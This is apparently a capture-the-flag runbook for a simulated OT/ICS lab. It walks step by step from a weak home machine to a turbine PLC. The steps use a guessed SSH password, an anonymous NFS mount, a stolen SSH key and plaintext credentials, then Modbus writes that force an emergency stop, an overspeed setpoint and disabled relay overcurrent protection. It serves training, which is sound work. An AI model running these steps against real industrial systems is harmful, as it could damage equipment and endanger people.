# Runbook: admin-home pivot to control zone

Two-hop attack chain from internet entry to the engineering workstation, then to the
turbine PLC. This is the intended entry path for the "access and persistence" scenario:
one weak home machine hands an attacker the keys to the entire control network.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
  - [Process intelligence gathering](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#process-intelligence-gathering)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `unseen-gate`, `wizzards-retreat`, `uupl-eng-ws`, `hex-turbine-plc`

Add `uupl-mqtt` to observe MQTT telemetry in Stage 4. The firewall is required for
realistic network segmentation between zones.

Entry: `./ctl ssh ponder` (or `ssh ponder@localhost -p 2222` for local dev).

## Attack path

### Stage 0: identify the target

```bash
# Read the mission briefing on unseen-gate
cat /run/adversary-readme.txt
# Internet segment: 10.10.0.0/24
# Admin at home: 10.10.0.10

# Confirm what is running
nmap -sV 10.10.0.10
# 22/tcp   open  ssh      OpenSSH
# 111/tcp  open  rpcbind  2-4 (RPC #100000)
# 2049/tcp open  nfs      3 (RPC #100003)
```

### Stage 1: compromise wizzards-retreat

Three paths are active simultaneously. Any one is sufficient.

Path A: SSH brute force or weak password
```bash
ssh rincewind@10.10.0.10
# Password: wizzard
```

Path B: NFS anonymous mount (world-readable share, no credentials required)
```bash
showmount -e 10.10.0.10
# Export list for 10.10.0.10:
# /work *

mkdir /tmp/loot
mount -t nfs -o vers=3 10.10.0.10:/work /tmp/loot
cat /tmp/loot/notes.txt
# VPN instructions, engineering workstation address, SCADA and historian URLs
# No shell, but orients the attacker within the topology and confirms the pivot target
```

Path C: OSINT from the attacker machine
```bash
cat ~/loot/prior-recon.txt
# Contains 10.10.0.10 as a known host with open ports noted
# Then follow Path A
```

### Stage 2: collect loot from wizzards-retreat

```bash
# SSH key for the engineering workstation
cat ~/.ssh-keys/uupl_eng_key
# Ed25519 private key for engineer@10.10.2.30

# Network notes
cat ~/notes.txt
# historian: http://10.10.2.10:8080
# scada:     http://10.10.2.20:8080
# enterprise: 10.10.1.0/24
# engineering workstation: 10.10.2.30

# WireGuard config (cosmetic, documents the dual-homed VPN simulation)
cat ~/.vpn/uupl-vpn.conf

# Copy the key to unseen-gate for use
# From unseen-gate:
scp rincewind@10.10.0.10:~/.ssh-keys/uupl_eng_key ./uupl_eng_key
chmod 600 uupl_eng_key
```

### Stage 3: engineering workstation, direct key entry

```bash
# wizzards-retreat's enterprise NIC is 10.10.1.3
# engineering workstation is on the operational zone at 10.10.2.30

# From wizzards-retreat (or forward the key to unseen-gate first):
ssh -i ~/.ssh-keys/uupl_eng_key engineer@10.10.2.30
# No password. The authorised key on the engineering workstation matches.

# Read every control zone credential in one file
type config\plc-access.conf
# [turbine_plc]
# host     = 10.10.3.21
# protocol = Modbus TCP
# port     = 502
# user     = turbineadmin
# notes    = no authentication on Modbus
#
# [relay_a]
# host     = 10.10.3.31
# user     = admin
# pass     = relay1234
#
# [relay_b]
# host     = 10.10.3.32
# ...

# Confirm the control zone is reachable
cat /home/engineer/plc_poll.log
# Timestamped governor setpoint polls: confirms PLC is live

# Check what else is in the profile
type Documents\engineering_notes.txt
# Historian credentials, SCADA credentials, HMI address
```

### Stage 4: turbine PLC, read and manipulate

```bash
# engineering workstation has control zone NIC at 10.10.3.100
# All control zone devices are directly reachable from here

cd C:\Users\engineer\Tools

# Read live turbine state
/venv/bin/python3 modbus_read.py 10.10.3.21 502 input 0 11
# [2997, 308, 86, 231, 229, 148, 147, 500, 67800, 42, 11]
# IR[0]=RPM  IR[1]=temp_C  IR[2]=pressure_bar  IR[3]/[4]=voltage_a/b
# IR[5]/[6]=current_a/b  IR[7]=freq_x10  IR[8]=power_W  IR[9]=oil  IR[10]=vibration

# Read holding registers: setpoints and thresholds
/venv/bin/python3 modbus_read.py 10.10.3.21 502 holding 0 4
# [3000, 45, 80, 200]
# HR[0]=governor_setpoint_RPM  HR[1]=fuel_valve%  HR[2]=cooling_pump%  HR[3]=oc_threshold

# Subscribe to MQTT telemetry (real-time stream, no credentials)
mosquitto_sub -h 10.10.3.60 -t 'uupl/turbine/telemetry' -v
# Confirms MQTT broker at 10.10.3.60 is open and publishing every 5 seconds

# Emergency stop
/venv/bin/python3 modbus_write.py 10.10.3.21 502 coil 0 1

# Overspeed trip (stealthier, looks like a protection event)
/venv/bin/python3 modbus_write.py 10.10.3.21 502 holding 0 4000
# Governor setpoint raised to 4000 RPM (above 3300 RPM overspeed threshold)

# Relay manipulation: disable overcurrent protection on feeder A
/venv/bin/python3 modbus_write.py 10.10.3.31 502 holding 2 0
# relay_a HR[2] is overcurrent threshold; 0 trips on any measurable current
```

## Flag placement

Place the flag in a file on the engineering workstation at
`C:\Users\engineer\Documents\flag.txt` or in a register the participant reads after
successfully tripping the turbine. For a register-based flag, write it to IR[10] in
`plc_server.py` when the estop coil goes high.

For a credential-chain challenge, embed the flag in `config\plc-access.conf` behind
a comment that only appears after SSHing in: `# flag: RM{...}`.

## In one line

`unseen-gate` → `wizzards-retreat` (NFS anonymous mount or weak SSH password) → Ed25519 key →
`engineering workstation` (direct key login) → `plc-access.conf` →
turbine PLC emergency stop.

Total credential use: one password (`wizzard`) if taking the SSH path; zero credentials if
taking the NFS path to the notes file. Everything else follows from the key.

## TL;DR

Rincewind's home machine is the weakest link in a chain that ends at a turbine PLC.
No vulnerability exploitation, no zero-days. A world-readable NFS share hands out network
notes to anyone who asks, and the engineering workstation's authorised key list includes a
key stored in a home directory on the internet. That is the problem.